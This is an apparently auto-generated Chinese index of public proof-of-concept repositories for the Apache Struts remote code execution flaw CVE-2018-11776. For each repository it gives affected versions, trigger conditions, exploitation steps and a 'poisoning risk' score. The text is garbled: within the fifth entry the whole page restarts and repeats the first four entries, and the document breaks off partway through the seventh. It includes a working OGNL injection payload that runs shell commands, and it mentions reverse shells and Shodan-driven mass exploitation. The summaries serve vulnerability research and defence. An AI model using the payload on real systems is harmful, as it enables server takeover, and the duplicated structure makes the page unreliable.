# CVE-2018-11776

> 📦 该CVE有 **17** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-11776-649_Apache-Struts-Shodan-Exploit.md](../2018/CVE-2018-11776-649_Apache-Struts-Shodan-Exploit.md)

## CVE-2018-11776-Apache Struts 远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace 为 true，且存在特定的命名空间配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-11776 是一个 Apache Struts 2 的远程代码执行漏洞。该漏洞是由于 Struts 框架在处理某些配置时，未对用户提供的命名空间进行充分验证，导致攻击者可以通过构造恶意的 URL，执行任意代码。

**有效性：**

根据漏洞库信息和搜索引擎结果，以及提供的PoC代码，可以确认该漏洞是真实存在的，并且存在可用的PoC。PoC代码通过构造包含 OGNL 表达式的恶意 URL，利用 Struts 框架的漏洞执行任意命令。

**投毒风险：**

PoC 代码本身的主要功能是利用 CVE-2018-11776 漏洞进行远程代码执行。然而，需要注意的是，该 PoC 利用了 Shodan API 进行大规模扫描和漏洞利用，这本身就可能被滥用。虽然作者声明该工具仅供研究用途，并省略了 Shodan 搜索参数以防止恶意使用，但仍然存在以下潜在的投毒风险：

*   **依赖项风险：** 该 PoC 依赖于 `requests` 和 `shodan` 库。如果这些依赖项被恶意篡改，例如通过 PyPI 投毒，可能会引入额外的安全风险。
*   **API 密钥泄露：** 该 PoC 将 Shodan API 密钥存储在 `api.txt` 文件中。如果该文件被意外泄露，攻击者可以使用该密钥进行恶意活动。
*   **大规模扫描风险：** 即使省略了 Shodan 搜索参数，攻击者仍然可以通过修改 PoC 代码来指定目标 IP 地址或 IP 范围，从而进行有针对性的大规模扫描和攻击。
*   **命令执行风险：** PoC 允许执行任意命令，攻击者可以利用该漏洞植入恶意代码、窃取敏感信息或进行其他恶意活动。

因此，该 PoC 存在一定的投毒风险，需要谨慎使用，并确保从可信的来源获取依赖项，并妥善保管 Shodan API 密钥。

综合考虑，该代码存在一定的风险，但是由于代码相对简单,大部分代码为漏洞利用,小部分为API调用,API调用不影响漏洞利用的恶意性,所以投毒风险评分为10%。

**利用方式：**

1.  **漏洞触发：** 当 `alwaysSelectFullNamespace` 设置为 `true`，并且应用程序的命名空间配置不正确时，攻击者可以构造包含 OGNL 表达式的恶意 URL。
2.  **OGNL 表达式注入：** 恶意 URL 中的 OGNL 表达式会被 Struts 框架解析和执行。
3.  **远程代码执行：** 通过 OGNL 表达式，攻击者可以执行任意系统命令，从而控制服务器。

**项目地址:** [649/Apache-Struts-Shodan-Exploit](https://github.com/649/Apache-Struts-Shodan-Exploit)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #2

**来源**: [CVE-2018-11776-Ekultek_Strutter.md](../2018/CVE-2018-11776-Ekultek_Strutter.md)

## CVE-2018-11776-Apache Struts远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace 为 true，且存在特定命名空间配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-11776是Apache Struts 2的一个远程代码执行漏洞。根据漏洞库信息，当`alwaysSelectFullNamespace`配置为true时，并且当结果没有命名空间且其上层包没有或具有通配符命名空间时，或者在使用没有值和操作设置的url标签且其上层包没有或具有通配符命名空间时，可能导致远程代码执行。

**有效性评估：**
提供的PoC代码 (`strutter.py`) 旨在利用此漏洞。它构造一个包含OGNL表达式的恶意URL，该表达式允许执行任意命令。PoC包括使用Shodan搜索潜在目标的选项。根据搜索结果，已经存在公开可用的漏洞利用代码，因此PoC代码的有效性很高。

**投毒风险分析：**
PoC代码本身专注于利用，但存在一些潜在的投毒风险。PoC 中选择payload的`pwn()` 函数未完成，存在后续添加恶意payload的可能, 并且 `strutter.py` 脚本具有从外部获取命令(`-C` 参数)并执行的能力，如果使用者不小心使用了不可信的命令，可能会导致恶意代码在目标系统上执行。但总体来说，代码主要目的在于漏洞利用，投毒的可能性相对较低，约为10%。需要注意的是,通过Shodan搜索目标并利用，可能会无意中攻击到蜜罐或其他安全设备。

**利用方式：**
1.  **配置检查：** 漏洞利用的前提是目标Struts应用的`alwaysSelectFullNamespace`配置为true，这通常需要了解目标应用的配置。
2.  **构造恶意URL：** 通过构造包含恶意OGNL表达式的URL来触发漏洞。这个表达式允许执行任意命令。
3.  **发送请求：** 将构造的URL发送到目标Struts应用。
4.  **命令执行：** 如果目标存在漏洞，服务器将执行OGNL表达式中的命令。
5.  **结果获取：**  PoC代码中尝试读取命令执行的结果，并通过ServletActionContext获取response的writer返回。

总体来说，该漏洞利用有效，但需要特定的配置条件才能触发。PoC代码本身存在一定的投毒风险，主要来自使用者不小心执行恶意命令的可能性。

**项目地址:** [Ekultek/Strutter](https://github.com/Ekultek/Strutter)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #3

**来源**: [CVE-2018-11776-OzNetNerd_apche-struts-vuln-demo-cve-2018-11776.md](../2018/CVE-2018-11776-OzNetNerd_apche-struts-vuln-demo-cve-2018-11776.md)

## CVE-2018-11776-Apache Struts远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace为true，结果未指定namespace或namespace为通配符

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-11776是Apache Struts 2中的一个远程代码执行漏洞。当`alwaysSelectFullNamespace`设置为true时（无论是用户配置还是插件如Convention Plugin所致），且满足以下条件，就可能发生RCE：

*   结果 (results) 在没有命名空间的情况下使用，并且其上层包没有或拥有通配符命名空间。
*   使用url标签，该标签没有value和action设置，并且其上层包没有或拥有通配符命名空间。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码（CloudFormation模板），可以判定此漏洞的POC是有效的。漏洞库信息中明确指出存在公开可用的利用代码 (例如：https://github.com/hook-s3c/CVE-2018-11776-Python-PoC )，搜索结果也表明该漏洞已被广泛研究并存在多种利用方式。提供的CloudFormation模板旨在快速部署一个包含易受攻击的Struts2实例的环境，并提供用于验证和利用漏洞的命令。

**投毒风险分析：**

漏洞利用代码（CloudFormation模板）本身是用于搭建一个可用于测试CVE-2018-11776漏洞的环境，从模板内容来看，主要用于配置AWS资源，例如VPC，子网，安全组和EC2实例。虽然没有明显的恶意代码，但仍存在一定的投毒风险，因为攻击者可能会修改模板，例如：

1.  **在EC2实例的启动脚本中植入后门。** 模板定义了EC2实例，攻击者可以在启动脚本中添加恶意代码，例如下载并执行恶意软件。
2.  **修改安全组规则。** 模板定义了安全组规则，攻击者可以添加允许从任意IP地址访问的规则，从而暴露更多端口和服务。
3.  **修改镜像AMI** 替换成带有后门的AMI镜像。

此外，`RunReverseShell` 命令也可能被恶意修改以执行其他命令，并非仅仅建立反向连接。

综合考虑，虽然提供的代码主要用于漏洞演示，但如果被恶意修改，存在一定的投毒风险，风险预估为10%。

**利用方式分析：**

利用方式主要通过构造恶意的URL，触发OGNL表达式注入，从而执行任意代码。具体步骤如下：

1.  **确定目标系统满足漏洞利用条件。** 即`alwaysSelectFullNamespace`为true，且存在未指定namespace的result或url标签，或者其上层package的namespace为通配符。
2.  **构造恶意URL。** URL中包含OGNL表达式，用于执行任意命令。例如：
    ```
    ${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
    ```
3.  **发送恶意URL到目标系统。** 目标系统解析URL时，会执行OGNL表达式，从而执行攻击者指定的命令。

攻击者可以通过反向shell等方式获取目标系统的控制权。

**项目地址:** [OzNetNerd/apche-struts-vuln-demo-cve-2018-11776](https://github.com/OzNetNerd/apche-struts-vuln-demo-cve-2018-11776)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #4

**来源**: [CVE-2018-11776-arlyone_Apache-Struts-0Day-Exploit.md](../2018/CVE-2018-11776-arlyone_Apache-Struts-0Day-Exploit.md)

## CVE-2018-11776-Apache Struts-远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace 为 true, 存在结果页面且上层package没有namespace或为通配符namespace, 或使用url tag 且没有value和action属性且上层package没有namespace或为通配符namespace。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-11776 是一个 Apache Struts 2 的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞是由于Struts框架在特定配置下，对namespace处理不当，导致OGNL表达式注入，最终实现远程代码执行。漏洞影响版本为2.3到2.3.34以及2.5到2.5.16。

**有效性：**

提供的POC代码使用了 OGNL 表达式注入来执行系统命令。其原理是利用Struts框架的漏洞，构造恶意的URL，将OGNL表达式作为参数传递给服务器，服务器在解析参数时执行了该表达式，从而实现了远程代码执行。代码通过修改 OgnlUtil 类的 excludedPackageNames 和 excludedClasses 属性，绕过 Struts 的安全限制。POC利用了multipart/form-data的Content-Type来触发漏洞。基于搜索结果和漏洞库信息，该漏洞存在公开可用的expoloit，证明该PoC有效。

**投毒风险：**

提供的POC代码中，最可疑的地方是向目标服务器发送恶意构造的HTTP请求，存在注入恶意指令的潜在可能。但是，该代码的主要目的是利用已知漏洞执行命令，而非植入后门或恶意软件。虽然可能被滥用，但是从代码逻辑来看，主要功能是进行漏洞验证和利用，没有发现明显的恶意代码，因此可以认为不存在作者隐藏的投毒代码，存在投毒风险的概率较低，大概为1%。

**利用方式：**

1.  **确定目标Struts版本：** 确认目标应用使用的Struts版本在受影响范围内（2.3 to 2.3.34, 2.5 to 2.5.16）。
2.  **确认配置：** 确认 alwaysSelectFullNamespace 为 true，并且符合漏洞触发的特定条件(没有namespace或为通配符namespace)。
3.  **构造恶意URL：** 使用类似POC代码中使用的 OGNL 表达式，构造包含要执行的系统命令的恶意URL。
4.  **发送HTTP请求：** 使用工具如curl或POC代码中的urllib2，向目标服务器发送构造好的HTTP请求。
5.  **执行命令：** 如果漏洞存在，服务器将执行OGNL表达式中的系统命令，攻击者可以获取服务器的控制权。

**项目地址:** [arlyone/Apache-Struts-0Day-Exploit](https://github.com/arlyone/Apache-Struts-0Day-Exploit)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #5

**来源**: [CVE-2018-11776-bhdresh_CVE-2018-11776.md](../2018/CVE-2018-11776-bhdresh_CVE-2018-11776.md)

# CVE-2018-11776

> 📦 该CVE有 **16** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-11776-649_Apache-Struts-Shodan-Exploit.md](../2018/CVE-2018-11776-649_Apache-Struts-Shodan-Exploit.md)

## CVE-2018-11776-Apache Struts 远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace 为 true，且存在特定的命名空间配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-11776 是一个 Apache Struts 2 的远程代码执行漏洞。该漏洞是由于 Struts 框架在处理某些配置时，未对用户提供的命名空间进行充分验证，导致攻击者可以通过构造恶意的 URL，执行任意代码。

**有效性：**

根据漏洞库信息和搜索引擎结果，以及提供的PoC代码，可以确认该漏洞是真实存在的，并且存在可用的PoC。PoC代码通过构造包含 OGNL 表达式的恶意 URL，利用 Struts 框架的漏洞执行任意命令。

**投毒风险：**

PoC 代码本身的主要功能是利用 CVE-2018-11776 漏洞进行远程代码执行。然而，需要注意的是，该 PoC 利用了 Shodan API 进行大规模扫描和漏洞利用，这本身就可能被滥用。虽然作者声明该工具仅供研究用途，并省略了 Shodan 搜索参数以防止恶意使用，但仍然存在以下潜在的投毒风险：

*   **依赖项风险：** 该 PoC 依赖于 `requests` 和 `shodan` 库。如果这些依赖项被恶意篡改，例如通过 PyPI 投毒，可能会引入额外的安全风险。
*   **API 密钥泄露：** 该 PoC 将 Shodan API 密钥存储在 `api.txt` 文件中。如果该文件被意外泄露，攻击者可以使用该密钥进行恶意活动。
*   **大规模扫描风险：** 即使省略了 Shodan 搜索参数，攻击者仍然可以通过修改 PoC 代码来指定目标 IP 地址或 IP 范围，从而进行有针对性的大规模扫描和攻击。
*   **命令执行风险：** PoC 允许执行任意命令，攻击者可以利用该漏洞植入恶意代码、窃取敏感信息或进行其他恶意活动。

因此，该 PoC 存在一定的投毒风险，需要谨慎使用，并确保从可信的来源获取依赖项，并妥善保管 Shodan API 密钥。

综合考虑，该代码存在一定的风险，但是由于代码相对简单,大部分代码为漏洞利用,小部分为API调用,API调用不影响漏洞利用的恶意性,所以投毒风险评分为10%。

**利用方式：**

1.  **漏洞触发：** 当 `alwaysSelectFullNamespace` 设置为 `true`，并且应用程序的命名空间配置不正确时，攻击者可以构造包含 OGNL 表达式的恶意 URL。
2.  **OGNL 表达式注入：** 恶意 URL 中的 OGNL 表达式会被 Struts 框架解析和执行。
3.  **远程代码执行：** 通过 OGNL 表达式，攻击者可以执行任意系统命令，从而控制服务器。

**项目地址:** [649/Apache-Struts-Shodan-Exploit](https://github.com/649/Apache-Struts-Shodan-Exploit)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #2

**来源**: [CVE-2018-11776-Ekultek_Strutter.md](../2018/CVE-2018-11776-Ekultek_Strutter.md)

## CVE-2018-11776-Apache Struts远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace 为 true，且存在特定命名空间配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-11776是Apache Struts 2的一个远程代码执行漏洞。根据漏洞库信息，当`alwaysSelectFullNamespace`配置为true时，并且当结果没有命名空间且其上层包没有或具有通配符命名空间时，或者在使用没有值和操作设置的url标签且其上层包没有或具有通配符命名空间时，可能导致远程代码执行。

**有效性评估：**
提供的PoC代码 (`strutter.py`) 旨在利用此漏洞。它构造一个包含OGNL表达式的恶意URL，该表达式允许执行任意命令。PoC包括使用Shodan搜索潜在目标的选项。根据搜索结果，已经存在公开可用的漏洞利用代码，因此PoC代码的有效性很高。

**投毒风险分析：**
PoC代码本身专注于利用，但存在一些潜在的投毒风险。PoC 中选择payload的`pwn()` 函数未完成，存在后续添加恶意payload的可能, 并且 `strutter.py` 脚本具有从外部获取命令(`-C` 参数)并执行的能力，如果使用者不小心使用了不可信的命令，可能会导致恶意代码在目标系统上执行。但总体来说，代码主要目的在于漏洞利用，投毒的可能性相对较低，约为10%。需要注意的是,通过Shodan搜索目标并利用，可能会无意中攻击到蜜罐或其他安全设备。

**利用方式：**
1.  **配置检查：** 漏洞利用的前提是目标Struts应用的`alwaysSelectFullNamespace`配置为true，这通常需要了解目标应用的配置。
2.  **构造恶意URL：** 通过构造包含恶意OGNL表达式的URL来触发漏洞。这个表达式允许执行任意命令。
3.  **发送请求：** 将构造的URL发送到目标Struts应用。
4.  **命令执行：** 如果目标存在漏洞，服务器将执行OGNL表达式中的命令。
5.  **结果获取：**  PoC代码中尝试读取命令执行的结果，并通过ServletActionContext获取response的writer返回。

总体来说，该漏洞利用有效，但需要特定的配置条件才能触发。PoC代码本身存在一定的投毒风险，主要来自使用者不小心执行恶意命令的可能性。

**项目地址:** [Ekultek/Strutter](https://github.com/Ekultek/Strutter)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #3

**来源**: [CVE-2018-11776-OzNetNerd_apche-struts-vuln-demo-cve-2018-11776.md](../2018/CVE-2018-11776-OzNetNerd_apche-struts-vuln-demo-cve-2018-11776.md)

## CVE-2018-11776-Apache Struts远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace为true，结果未指定namespace或namespace为通配符

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-11776是Apache Struts 2中的一个远程代码执行漏洞。当`alwaysSelectFullNamespace`设置为true时（无论是用户配置还是插件如Convention Plugin所致），且满足以下条件，就可能发生RCE：

*   结果 (results) 在没有命名空间的情况下使用，并且其上层包没有或拥有通配符命名空间。
*   使用url标签，该标签没有value和action设置，并且其上层包没有或拥有通配符命名空间。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码（CloudFormation模板），可以判定此漏洞的POC是有效的。漏洞库信息中明确指出存在公开可用的利用代码 (例如：https://github.com/hook-s3c/CVE-2018-11776-Python-PoC )，搜索结果也表明该漏洞已被广泛研究并存在多种利用方式。提供的CloudFormation模板旨在快速部署一个包含易受攻击的Struts2实例的环境，并提供用于验证和利用漏洞的命令。

**投毒风险分析：**

漏洞利用代码（CloudFormation模板）本身是用于搭建一个可用于测试CVE-2018-11776漏洞的环境，从模板内容来看，主要用于配置AWS资源，例如VPC，子网，安全组和EC2实例。虽然没有明显的恶意代码，但仍存在一定的投毒风险，因为攻击者可能会修改模板，例如：

1.  **在EC2实例的启动脚本中植入后门。** 模板定义了EC2实例，攻击者可以在启动脚本中添加恶意代码，例如下载并执行恶意软件。
2.  **修改安全组规则。** 模板定义了安全组规则，攻击者可以添加允许从任意IP地址访问的规则，从而暴露更多端口和服务。
3.  **修改镜像AMI** 替换成带有后门的AMI镜像。

此外，`RunReverseShell` 命令也可能被恶意修改以执行其他命令，并非仅仅建立反向连接。

综合考虑，虽然提供的代码主要用于漏洞演示，但如果被恶意修改，存在一定的投毒风险，风险预估为10%。

**利用方式分析：**

利用方式主要通过构造恶意的URL，触发OGNL表达式注入，从而执行任意代码。具体步骤如下：

1.  **确定目标系统满足漏洞利用条件。** 即`alwaysSelectFullNamespace`为true，且存在未指定namespace的result或url标签，或者其上层package的namespace为通配符。
2.  **构造恶意URL。** URL中包含OGNL表达式，用于执行任意命令。例如：
    ```
    ${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
    ```
3.  **发送恶意URL到目标系统。** 目标系统解析URL时，会执行OGNL表达式，从而执行攻击者指定的命令。

攻击者可以通过反向shell等方式获取目标系统的控制权。

**项目地址:** [OzNetNerd/apche-struts-vuln-demo-cve-2018-11776](https://github.com/OzNetNerd/apche-struts-vuln-demo-cve-2018-11776)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #4

**来源**: [CVE-2018-11776-arlyone_Apache-Struts-0Day-Exploit.md](../2018/CVE-2018-11776-arlyone_Apache-Struts-0Day-Exploit.md)

## CVE-2018-11776-Apache Struts-远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace 为 true, 存在结果页面且上层package没有namespace或为通配符namespace, 或使用url tag 且没有value和action属性且上层package没有namespace或为通配符namespace。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-11776 是一个 Apache Struts 2 的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞是由于Struts框架在特定配置下，对namespace处理不当，导致OGNL表达式注入，最终实现远程代码执行。漏洞影响版本为2.3到2.3.34以及2.5到2.5.16。

**有效性：**

提供的POC代码使用了 OGNL 表达式注入来执行系统命令。其原理是利用Struts框架的漏洞，构造恶意的URL，将OGNL表达式作为参数传递给服务器，服务器在解析参数时执行了该表达式，从而实现了远程代码执行。代码通过修改 OgnlUtil 类的 excludedPackageNames 和 excludedClasses 属性，绕过 Struts 的安全限制。POC利用了multipart/form-data的Content-Type来触发漏洞。基于搜索结果和漏洞库信息，该漏洞存在公开可用的expoloit，证明该PoC有效。

**投毒风险：**

提供的POC代码中，最可疑的地方是向目标服务器发送恶意构造的HTTP请求，存在注入恶意指令的潜在可能。但是，该代码的主要目的是利用已知漏洞执行命令，而非植入后门或恶意软件。虽然可能被滥用，但是从代码逻辑来看，主要功能是进行漏洞验证和利用，没有发现明显的恶意代码，因此可以认为不存在作者隐藏的投毒代码，存在投毒风险的概率较低，大概为1%。

**利用方式：**

1.  **确定目标Struts版本：** 确认目标应用使用的Struts版本在受影响范围内（2.3 to 2.3.34, 2.5 to 2.5.16）。
2.  **确认配置：** 确认 alwaysSelectFullNamespace 为 true，并且符合漏洞触发的特定条件(没有namespace或为通配符namespace)。
3.  **构造恶意URL：** 使用类似POC代码中使用的 OGNL 表达式，构造包含要执行的系统命令的恶意URL。
4.  **发送HTTP请求：** 使用工具如curl或POC代码中的urllib2，向目标服务器发送构造好的HTTP请求。
5.  **执行命令：** 如果漏洞存在，服务器将执行OGNL表达式中的系统命令，攻击者可以获取服务器的控制权。

**项目地址:** [arlyone/Apache-Struts-0Day-Exploit](https://github.com/arlyone/Apache-Struts-0Day-Exploit)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #5

**来源**: [CVE-2018-11776-brianwrf_S2-057-CVE-2018-11776.md](../2018/CVE-2018-11776-brianwrf_S2-057-CVE-2018-11776.md)

## CVE-2018-11776 Apache Struts 远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace 为 true，且存在特定的namespace配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-11776 是 Apache Struts 2 的一个远程代码执行漏洞，存在于 2.3.x 版本到 2.3.34 和 2.5.x 版本到 2.5.16 中。

**有效性：**
提供的POC代码（exploit.py）是有效的。它通过构造恶意的OGNL表达式注入到URL中，利用Struts框架的漏洞执行任意系统命令。

**投毒风险：**
代码总体上是直接明了的漏洞利用程序，主要功能是通过构造包含恶意OGNL表达式的URL来利用漏洞。投毒的可能性较低，主要风险在于使用者使用该脚本攻击未经授权的系统。脚本本身包含少量payload，但大部分是用于执行命令和回显结果，没有发现明显的恶意代码或后门。但是要提醒使用者对从任何来源下载的代码都要谨慎审查。故投毒风险为5%。

**利用方式：**
1.  **漏洞触发条件:** 需要 `alwaysSelectFullNamespace` 为 true，或者使用 Convention Plugin 等插件导致该配置生效。
2.  **构造恶意URL:**  攻击者需要构造包含恶意 OGNL 表达式的 URL。OGNL 表达式允许攻击者执行任意代码。
3.  **命令执行:**  恶意 OGNL 表达式利用 `java.lang.Runtime.getRuntime().exec()` 执行操作系统命令。
4.  **结果回显:**  命令执行的结果通过 `HttpServletResponse` 的 `Writer` 对象回显到响应中。

**总结:**
CVE-2018-11776 是一个严重的远程代码执行漏洞。攻击者可以通过构造恶意的URL，在目标服务器上执行任意命令，导致服务器被完全控制。

**参考资料:**
*   NVD: [https://nvd.nist.gov/vuln/detail/cve-2018-11776](https://nvd.nist.gov/vuln/detail/cve-2018-11776)
*   Qualys Blog: [https://blog.qualys.com/vulnerabilities-threat-research/2018/08/23/detecting-apache-struts-2-namespace-rce-cve-2018-11776](https://blog.qualys.com/vulnerabilities-threat-research/2018/08/23/detecting-apache-struts-2-namespace-rce-cve-2018-11776)
*   Keysight Blog: [https://www.keysight.com/blogs/en/tech/nwvs/2022/06/03/strutting-to-remote-code-execution-anatomy-of-cve-2018-11776](https://www.keysight.com/blogs/en/tech/nwvs/2022/06/03/strutting-to-remote-code-execution-anatomy-of-cve-2018-11776)

**项目地址:** [brianwrf/S2-057-CVE-2018-11776](https://github.com/brianwrf/S2-057-CVE-2018-11776)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #6

**来源**: [CVE-2018-11776-cucadili_CVE-2018-11776.md](../2018/CVE-2018-11776-cucadili_CVE-2018-11776.md)

## CVE-2018-11776 Apache Struts2 远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts2

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.3 to 2.3.34 and 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace 为 true，且存在特定命名空间配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-11776 漏洞存在于 Apache Struts 2 框架中，允许攻击者通过构造特制的 URL 来执行任意代码。漏洞的触发条件是 `alwaysSelectFullNamespace` 参数为 true，并且应用程序的命名空间配置存在缺陷，例如缺少命名空间或者使用通配符命名空间。根据漏洞库信息和搜索结果，此漏洞影响 Struts 2.3.x 到 2.3.34 以及 2.5.x 到 2.5.16 版本。

**有效性：**
提供的POC代码包含Suricata规则和内核模块，用于检测和阻止利用此漏洞的攻击。Python PoC的github链接也被给出，证明此漏洞存在可利用性。根据搜索结果，此漏洞已被广泛利用，因此提供的PoC代码是有效的。

**投毒风险：**
提供的代码仓库中存在一定投毒风险，风险预估为10%。
*   `module_kernel.ko`：这是一个内核模块，如果编译和加载过程被篡改，可能引入恶意代码。虽然提供的代码看起来是无害的，但不能完全排除编译过程被污染的可能性。
*   `test.rules`：Suricata规则本身是用于检测恶意流量的，但如果规则被设计为故意放过某些恶意流量，则可以达到投毒的效果。当前规则只是简单的检测是否存在`allowStaticMethodAccess`，可以绕过。
*   README.md中提供的github链接可能指向包含恶意payload的PoC，虽然目前无法确定，但也存在潜在风险。

**利用方式：**
1.  **确定目标环境：** 目标应用程序必须使用受影响的 Apache Struts 2 版本（2.3.x 到 2.3.34 以及 2.5.x 到 2.5.16），且 `alwaysSelectFullNamespace` 配置为 true。
2.  **构造恶意URL：** 攻击者需要构造一个包含恶意 OGNL 表达式的 URL。该表达式会被 Struts 2 框架解析和执行，从而实现远程代码执行。
3.  **发送HTTP请求：** 将构造好的恶意 URL 作为 HTTP 请求发送到目标应用程序。
4.  **执行任意代码：** 如果漏洞成功利用，攻击者可以在目标服务器上执行任意代码，例如安装后门、窃取数据或控制系统。

**缓解措施：**
1.  升级到不受影响的 Apache Struts 2 版本。
2.  确保 `alwaysSelectFullNamespace` 参数设置为 false（如果不需要该功能）。
3.  配置合适的命名空间，避免使用通配符命名空间。
4.  使用 Web 应用防火墙（WAF）或入侵检测系统（IDS）来检测和阻止恶意请求。

**项目地址:** [cucadili/CVE-2018-11776](https://github.com/cucadili/CVE-2018-11776)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #7

**来源**: [CVE-2018-11776-cved-sources_cve-2018-11776.md](../2018/CVE-2018-11776-cved-sources_cve-2018-11776.md)

## CVE-2018-11776 Apache Struts 远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts

**危害等级:** 高危，可导致服务器被完全控制

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace 为 true， 且存在特定配置的namespace或wildcard namespace

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-11776 是一个 Apache Struts 框架中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞是由于 Struts 对 namespace 验证不足，导致 OGNL 表达式注入，从而允许未经身份验证的攻击者执行任意代码。如果 alwaysSelectFullNamespace 设置为 true，且结果没有 namespace，同时其上层 package 没有 namespace 或使用了 wildcard namespace，就可能触发此漏洞。漏洞利用代码中的 Dockerfile 演示了如何构建一个包含漏洞的 Struts 应用，并通过修改 struts.xml 文件来触发漏洞。具体做法是向 struts.xml 文件中添加一个 action，该 action 的结果类型为 chain，指向 date 命令。访问这个 action 将会执行 date 命令，证明了远程代码执行的可能性。

**有效性：** 提供的 Dockerfile 确实可以创建一个易受攻击的 Struts 2 环境，并且包含的 struts.xml 修改方式能够触发漏洞，因此，该 PoC 代码是有效的。

